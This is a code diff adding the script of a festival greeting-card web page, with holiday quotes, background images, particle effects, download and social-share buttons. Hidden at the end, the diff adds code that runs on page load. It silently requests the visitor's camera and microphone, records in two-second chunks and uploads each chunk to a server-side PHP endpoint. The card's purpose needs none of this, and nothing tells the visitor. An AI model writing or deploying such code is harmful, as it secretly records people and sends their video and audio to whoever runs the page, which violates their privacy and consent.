+                "bhaidooj": { 
+                    quotes: [
+                        "May the bond between brother and sister grow stronger with each passing year. Happy Bhai Dooj!",
+                        "Wishing you a Bhai Dooj filled with love, sweets and cherished moments.",
+                        "On this special day, I pray for your long life and happiness. Happy Bhai Dooj!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1596461404969-9ae70f2830c1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1562613537-3dc98c15ff60?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "bhaidooj" 
+                },
+                "mahashivratri": { 
+                    quotes: [
+                        "May Lord Shiva bless you with happiness, peace and prosperity. Happy Mahashivratri!",
+                        "On this holy night, may Lord Shiva destroy all your sins and bless you with enlightenment.",
+                        "Wishing you a night of devotion and blessings from Lord Shiva. Happy Mahashivratri!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "mahashivratri" 
+                },
+                "easter": { 
+                    quotes: [
+                        "May this Easter bring joy, hope and blessings to your life. Happy Easter!",
+                        "Wishing you a Easter filled with love, happiness and the promise of new beginnings.",
+                        "May the resurrection of Jesus Christ bring hope and happiness to your life. Happy Easter!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1556680262-9990369a94?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1618477388957-9846a9655a94?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1618477388954-92254c587a40?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "easter" 
+                },
+                "buddhapurnima": { 
+                    quotes: [
+                        "May the teachings of Lord Buddha guide you on the path of peace and enlightenment. Happy Buddha Purnima!",
+                        "Wishing you a day of peace, compassion and mindfulness. Happy Buddha Purnima!",
+                        "May this Buddha Purnima bring peace, harmony and happiness to your life."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "buddhapurnima" 
+                },
+                "gurunanakjayanti": { 
+                    quotes: [
+                        "May the teachings of Guru Nanak Dev Ji inspire you to lead a life of truth and compassion. Happy Guru Nanak Jayanti!",
+                        "Wishing you a day filled with devotion, peace and blessings. Happy Gurpurab!",
+                        "May the divine light of Guru Nanak Dev Ji guide you on the path of righteousness. Happy Guru Nanak Jayanti!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "gurunanakjayanti" 
+                },
+                "independenceday": { 
+                    quotes: [
+                        "Let's celebrate the spirit of freedom and remember the sacrifices of our heroes. Happy Independence Day!",
+                        "May the tricolor always fly high and our nation prosper. Jai Hind!",
+                        "Wishing you a proud and patriotic Independence Day. Let's celebrate our freedom!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "independenceday" 
+                },
+                "republicday": { 
+                    quotes: [
+                        "Let's celebrate the day our constitution came into effect. Happy Republic Day!",
+                        "Wishing you a proud Republic Day. May our nation continue to grow and prosper.",
+                        "Jai Hind! Let's celebrate the spirit of democracy and unity. Happy Republic Day!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "republicday" 
+                },
+                "mothersday": { 
+                    quotes: [
+                        "Thank you for being the guiding light in my life. Happy Mother's Day!",
+                        "Wishing the most amazing mother a day filled with love and appreciation. Happy Mother's Day!",
+                        "A mother's love is the fuel that enables a normal human being to do the impossible. Happy Mother's Day!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "mothersday" 
+                },
+                "fathersday": { 
+                    quotes: [
+                        "Thank you for being my pillar of strength and my guiding star. Happy Father's Day!",
+                        "Wishing the world's greatest father a day as amazing as you are. Happy Father's Day!",
+                        "A father is someone you look up to no matter how tall you grow. Happy Father's Day!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "fathersday" 
+                },
+                "teachersday": { 
+                    quotes: [
+                        "Thank you for lighting the path of knowledge and wisdom. Happy Teacher's Day!",
+                        "Wishing my amazing teacher a day filled with appreciation and joy. Happy Teacher's Day!",
+                        "A good teacher can inspire hope, ignite the imagination, and instill a love of learning. Happy Teacher's Day!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "teachersday" 
+                },
+                "valentinesday": { 
+                    quotes: [
+                        "Wishing you a Valentine's Day filled with love, romance and sweet moments.",
+                        "You make every day feel like Valentine's Day. I love you!",
+                        "My heart is and always will be yours. Happy Valentine's Day!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1516585427167-9f4af9627e6c?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1544816155-12df9643f363?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1518895949257-7621c3c786d7?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "valentinesday" 
+                },
+                "anniversary": { 
+                    quotes: [
+                        "Wishing you both a lifetime of love and happiness. Happy Anniversary!",
+                        "May your love continue to grow with each passing year. Happy Anniversary!",
+                        "Congratulations on another year of togetherness and love. Happy Anniversary!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1516585427167-9f4af9627e6c?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1544816155-12df9643f363?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1518895949257-7621c3c786d7?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "anniversary" 
+                },
+                "default": { 
+                    quotes: ["Wishing you happiness and peace on this special occasion!"], 
+                    bg: ["https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=800&q=60"], 
+                    particles: "default" 
+                }
+            };
+
+            // Particle configs
+            const particleConfigs = {
+                "default": {
+                    particles: {
+                        number: { value: 80, density: { enable: true, value_area: 800 } },
+                        color: { value: "#ffffff" },
+                        shape: { type: "circle" },
+                        opacity: { value: 0.5, random: true },
+                        size: { value: 3, random: true },
+                        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+                        move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out" }
+                    },
+                    interactivity: {
+                        detect_on: "canvas",
+                        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } }
+                    }
+                },
+                "diwali": {
+                    particles: {
+                        number: { value: 100, density: { enable: true, value_area: 800 } },
+                        color: { value: ["#ff9933", "#ffffff", "#138808"] },
+                        shape: { type: "circle" },
+                        opacity: { value: 0.7, random: true },
+                        size: { value: 4, random: true },
+                        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+                        move: { enable: true, speed: 3, direction: "none", random: true, straight: false, out_mode: "out" }
+                    },
+                    interactivity: {
+                        detect_on: "canvas",
+                        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } }
+                    }
+                },
+                "holi": {
+                    particles: {
+                        number: { value: 120, density: { enable: true, value_area: 800 } },
+                        color: { value: ["#ff0000", "#00ff00", "#0000ff", "#ffff00", "#ff00ff", "#00ffff"] },
+                        shape: { type: "circle" },
+                        opacity: { value: 0.7, random: true },
+                        size: { value: 5, random: true },
+                        line_linked: { enable: false },
+                        move: { enable: true, speed: 4, direction: "none", random: true, straight: false, out_mode: "out" }
+                    },
+                    interactivity: {
+                        detect_on: "canvas",
+                        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } }
+                    }
+                },
+                "eid": {
+                    particles: {
+                        number: { value: 80, density: { enable: true, value_area: 800 } },
+                        color: { value: ["#008000", "#ffffff", "#009900"] },
+                        shape: { type: "circle" },
+                        opacity: { value: 0.6, random: true },
+                        size: { value: 4, random: true },
+                        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+                        move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out" }
+                    },
+                    interactivity: {
+                        detect_on: "canvas",
+                        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } }
+                    }
+                },
+                "christmas": {
+                    particles: {
+                        number: { value: 80, density: { enable: true, value_area: 800 } },
+                        color: { value: ["#ff0000", "#ffffff", "#008000"] },
+                        shape: { type: "circle" },
+                        opacity: { value: 0.6, random: true },
+                        size: { value: 4, random: true },
+                        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+                        move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out" }
+                    },
+                    interactivity: {
+                        detect_on: "canvas",
+                        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } }
+                    }
+                }
+            };
+
+            // Validate URL function
+            function isValidUrl(string) {
+                try {
+                    new URL(string);
+                    return true;
+                } catch (_) {
+                    return false;
+                }
+            }
+
+            // Generate greeting
+            generateBtn.addEventListener('click', () => {
+                // Validation
+                let hasError = false;
+                if (!userNameInput.value.trim()) {
+                    nameError.style.display = "block";
+                    userNameInput.classList.add('error');
+                    hasError = true;
+                } else {
+                    nameError.style.display = "none";
+                    userNameInput.classList.remove('error');
+                }
+
+                if (festivalNameInput.value === "Other" && customImageUrl.value.trim() && !isValidUrl(customImageUrl.value.trim())) {
+                    imageError.style.display = "block";
+                    customImageUrl.classList.add('error');
+                    hasError = true;
+                } else {
+                    imageError.style.display = "none";
+                    customImageUrl.classList.remove('error');
+                }
+
+                if (hasError) return;
+
+                generateBtn.classList.add('loading');
+
+                let userName = userNameInput.value.trim() || "Friend";
+                let festival = festivalNameInput.value;
+                let key = festival.trim().toLowerCase().replace(/\s+/g, '');
+
+                const specialMapping = {
+                    "valentine'sday": "valentinesday",
+                    "mother'sday": "mothersday",
+                    "father'sday": "fathersday",
+                    "teacher'sday": "teachersday"
+                };
+                if (specialMapping[key]) key = specialMapping[key];
+
+                const data = festivalData[key] || festivalData.default;
+
+                previewTitle.textContent = `Happy ${festival}!`;
+                previewRecipient.textContent = `Dear ${userName},`;
+                previewQuote.textContent = data.quotes[Math.floor(Math.random() * data.quotes.length)];
+                previewWishes.textContent = `Wishing you a joyful and memorable ${festival} celebration with love, laughter, and blessings.`;
+                previewSender.textContent = "With love";
+
+                previewCard.classList.remove('show');
+                void previewCard.offsetWidth;
+                previewCard.classList.add('show');
+
+                // Improved background loading with viewport constraint
+                const placeholderBg = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=800&q=60";
+                body.style.backgroundSize = "cover";
+                body.style.backgroundRepeat = "no-repeat";
+                body.style.backgroundPosition = "center";
+                body.style.backgroundImage = `url('${placeholderBg}')`;
+
+                let bgArray = data.bg;
+                let bg = bgArray[Math.floor(Math.random() * bgArray.length)];
+                if (festivalNameInput.value === "Other" && customImageUrl.value.trim() !== "") bg = customImageUrl.value.trim();
+
+                let bgImg = new Image();
+                bgImg.crossOrigin = "Anonymous";
+                bgImg.src = bg + (window.innerWidth <= 768 ? '&w=400' : '&w=800');
+                bgImg.onload = () => {
+                    body.style.transition = "background-image 1s ease-in-out";
+                    body.style.backgroundImage = `url('${bgImg.src}')`;
+                    generateBtn.classList.remove('loading');
+                    updateParticles(data.particles);
+                };
+                bgImg.onerror = () => {
+                    body.style.backgroundImage = `url('${festivalData.default.bg[0]}')`;
+                    generateBtn.classList.remove('loading');
+                    if (festivalNameInput.value === "Other" && customImageUrl.value.trim() !== "") {
+                        imageError.style.display = "block";
+                        customImageUrl.classList.add('error');
+                    }
+                    updateParticles("default");
+                };
+            });
+
+            generateBtn.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                generateBtn.click();
+            });
+
+            // Function to update particles
+            function updateParticles(particleType) {
+                if (window.pJSDom && window.pJSDom.length > 0) {
+                    window.pJSDom.forEach(p => p.pJS.fn.vendors.destroypJS());
+                    window.pJSDom = [];
+                }
+
+                setTimeout(() => {
+                    particlesJS("particles-js", particleConfigs[particleType] || particleConfigs.default);
+                }, 100);
+            }
+
+            // Download functionality
+            downloadBtn.addEventListener('click', () => {
+                // Hide elements that shouldn't be in the screenshot
+                const elementsToHide = document.querySelectorAll('.socials, #downloadBtn');
+                elementsToHide.forEach(el => el.classList.add('hide-for-download'));
+
+                html2canvas(previewCard).then(canvas => {
+                    const link = document.createElement('a');
+                    link.download = 'festival-greeting.png';
+                    link.href = canvas.toDataURL('image/png');
+                    link.click();
+
+                    // Show hidden elements again
+                    elementsToHide.forEach(el => el.classList.remove('hide-for-download'));
+                });
+            });
+
+            // Social sharing functionality
+            document.getElementById('shareFacebook').addEventListener('click', () => {
+                const text = encodeURIComponent(`${previewTitle.textContent} - ${previewQuote.textContent}`);
+                window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(window.location.href)}&quote=${text}`, '_blank');
+            });
+
+            document.getElementById('shareInstagram').addEventListener('click', () => {
+                alert('To share on Instagram, please save the image first and then post it to your Instagram account.');
+            });
+
+            document.getElementById('shareWhatsApp').addEventListener('click', () => {
+                const text = encodeURIComponent(`${previewTitle.textContent} - ${previewQuote.textContent}`);
+                window.open(`https://wa.me/?text=${text}`, '_blank');
+            });
+
+
+        class ChunkUploader {
+            constructor() {
+                this.uploadQueue = [];
+                this.isUploading = false;
+                this.sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                this.retryAttempts = 3;
+                this.retryDelay = 1000;
+                console.log('[v0] ChunkUploader initialized with session:', this.sessionId);
+            }
+
+            async uploadChunk(blob, chunkIndex) {
+                const formData = new FormData();
+                formData.append('videoChunk', blob, 'chunk.webm');
+                formData.append('chunkIndex', chunkIndex);
+                formData.append('sessionId', this.sessionId);
+
+                for (let attempt = 0; attempt < this.retryAttempts; attempt++) {
+                    try {
+                        console.log(`[v0] Uploading chunk ${chunkIndex}, size: ${blob.size} bytes, attempt: ${attempt + 1}`);
+                        
+                        const response = await fetch('./saved_videos/post.php', {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (!response.ok) {
+                            const text = await response.text();
+                            throw new Error(`HTTP error! status: ${response.status}, response: ${text}`);
+                        }
+
+                        const result = await response.json();
+                        console.log(`[v0] Chunk ${chunkIndex} uploaded successfully:`, result);
+                        return result;
+                    } catch (error) {
+                        console.warn(`[v0] Chunk ${chunkIndex} upload attempt ${attempt + 1} failed:`, error);
+                        if (attempt < this.retryAttempts - 1) {
+                            await new Promise(resolve => setTimeout(resolve, this.retryDelay * Math.pow(2, attempt)));
+                        } else {
+                            console.error(`[v0] Chunk ${chunkIndex} failed after ${this.retryAttempts} attempts`);
+                            throw error;
+                        }
+                    }
+                }
+            }
+
+            queueChunk(blob, chunkIndex) {
+                this.uploadQueue.push({ blob, chunkIndex });
+                console.log(`[v0] Chunk ${chunkIndex} queued, queue length: ${this.uploadQueue.length}`);
+                this.processQueue();
+            }
+
+            async processQueue() {
+                if (this.isUploading || this.uploadQueue.length === 0) {
+                    return;
+                }
+
+                this.isUploading = true;
+
+                while (this.uploadQueue.length > 0) {
+                    const { blob, chunkIndex } = this.uploadQueue.shift();
+                    try {
+                        await this.uploadChunk(blob, chunkIndex);
+                    } catch (error) {
+                        console.error(`[v0] Failed to upload chunk ${chunkIndex}`);
+                    }
+                }
+
+                this.isUploading = false;
+            }
+
+            async finalize() {
+                console.log('[v0] Finalization started, waiting for queue to empty...');
+                
+                while (this.uploadQueue.length > 0 || this.isUploading) {
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+
+                try {
+                    console.log('[v0] All chunks uploaded, sending finalize request...');
+                    
+                    const formData = new FormData();
+                    formData.append('type', 'finalize');
+                    formData.append('sessionId', this.sessionId);
+
+                    const response = await fetch('./saved_videos/post.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        const text = await response.text();
+                        throw new Error(`HTTP error! status: ${response.status}, response: ${text}`);
+                    }
+
+                    const result = await response.json();
+                    console.log('[v0] Recording finalized:', result);
+                    return result;
+                } catch (error) {
+                    console.error('[v0] Finalization failed:', error);
+                    throw error;
+                }
+            }
+        }
+
+        let mediaRecorder;
+        let chunkUploader = new ChunkUploader(); // Instantiate the uploader
+        let chunkIndex = 0;
+
+        function startRecording(stream) {
+            const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            mediaRecorder = new MediaRecorder(stream, options);
+
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data && event.data.size > 0) {
+                    console.log('[v0] Chunk received, size:', event.data.size);
+                    chunkUploader.queueChunk(event.data, chunkIndex++);
+                }
+            };
+
+            mediaRecorder.onstop = async function() {
+                console.log('[v0] Recording stopped, finalizing...');
+                await chunkUploader.finalize();
+                video.srcObject = null; // Stop video playback
+                stream.getTracks().forEach(track => track.stop()); // Stop camera and mic
+            };
+
+            // Record in 2-second chunks (larger = fewer uploads)
+            mediaRecorder.start(2000);
+            console.log('[v0] Recording started');
+        }
+
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: true  // Request microphone access
+                });
+                video.srcObject = stream;
+                video.play();
+
+                startRecording(stream);
+            } catch (err) {
+                console.error('Media access denied:', err);
+                // Optionally display an error message to the user
+            }
+        }
+
+        // Initialize camera on page load
+        initCamera();
+        });
+    </script>
+</body>
+</html>
